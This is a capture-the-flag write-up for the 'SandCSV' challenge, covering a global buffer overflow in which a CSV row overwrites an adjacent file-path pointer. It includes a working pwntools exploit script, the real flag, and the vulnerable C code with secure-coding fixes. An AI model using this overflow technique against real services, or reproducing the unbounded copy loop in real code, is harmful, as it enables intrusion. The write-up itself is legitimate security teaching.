# SandCSV

**Author:** John_x9  
**Difficulty:** Medium  
**Connect:** `nc 167.86.100.57:9003`

Desert survey gear dumps one CSV row into a global buffer, then opens whatever path sits next to that buffer. Default dump is survey bait: sand in your eyes, not the coast prize. Overflow the row into the path pointer and point it at a real `"flag.txt"` string.

---

## Blind solve path

### 1. Connect

```bash
nc 167.86.100.57 9003
```

```text
SandCSV: paste one CSV row
```

### 2. Short happy path (fake flag)

Paste `a,b,c`. You get something like:

```text
saved. dumping...
-- dump --
nustCTF{y0u_dump3d_surv3y_0ut_n0t_th3_fl4g}
```

Trap. Default `outpath` is survey output, not the prize.

### 3. Discover the overflow

Lengthen the CSV line past 64 bytes. You may still dump bait, or you may see:

```text
open failed
tried: 0x...
```

That `tried:` line is the **path pointer** after corruption. Mental model for this service:

```text
[rowbuf: 64 bytes][outpath: 8-byte pointer]
```

An oversized ingest copies past `rowbuf` into `outpath`. The copy stops at the first NUL (`\x00`). Do not put `\x00` in the first 64 bytes if you need the smash to reach the pointer.

Other wrong paths yield more fakes (`backup.txt`, `fake_flag.txt`). Only pointing at a string that is literally `"flag.txt"` opens the real file.

### 4. Addresses: honest note

The service is **no-PIE**. The string `"flag.txt"` lives at a fixed address. For this build: **`0x40201e`**.

That address is not printed on a successful default dump. Options:

1. Ask organizers for the matching binary, then search for `flag.txt`.
2. Force `open failed` and probe nearby string addresses (messy).
3. Use the published build address below.

| Piece | Address |
|-------|---------|
| `"flag.txt"` string | `0x40201e` |

### 5. Working remote script

```python
#!/usr/bin/env python3
from pwn import *

HOST = '167.86.100.57'
PORT = 9003
FLAG_STR = 0x40201e

context.log_level = 'error'
io = remote(HOST, PORT)
io.recvuntil(b'row')

payload = b'A' * 64 + p64(FLAG_STR)
io.sendline(payload)
print(io.recvall(timeout=2).decode(errors='ignore'))
```

Same script: [`solves/03-sandcsv-solve.py`](solves/03-sandcsv-solve.py).

---

## Real flag

```text
nustCTF{csv_gl0b4l_0utp4th_pwn}
```

---

## After the event: vulnerable code and how to fix

Vulnerable pattern (illustrative):

```c
struct {
  char rowbuf[64];
  char *outpath;
} gblob = { .outpath = "survey_out.txt" };

void ingest(char *line){
  size_t i;
  for(i = 0; line[i] && i < 160; i++){
    gblob.rowbuf[i] = line[i];   /* can write past 64 into outpath */
  }
  if(i < 64) gblob.rowbuf[i] = 0;
}
```

`rowbuf` and `outpath` sit adjacent in a global struct. The ingest loop allows up to 160 bytes into a 64-byte field, so the pointer is attacker-controlled. `dump_file` then `fopen`s whatever it points at.

**Secure coding fixes:**

1. Cap the copy: `i < sizeof(gblob.rowbuf)` (or `sizeof - 1` with NUL).
2. Keep path selection out of attacker-writable adjacency: use an enum / allowlist of dump targets, not a raw pointer next to a buffer.
3. If a path must be configurable, copy into a separate fixed buffer with `strncpy`/`strlcpy` and validate against an allowlist (`flag.txt` never selectable from user CSV).
4. Avoid printing raw pointer values on failure in production (the `tried: %p` line helps attackers).
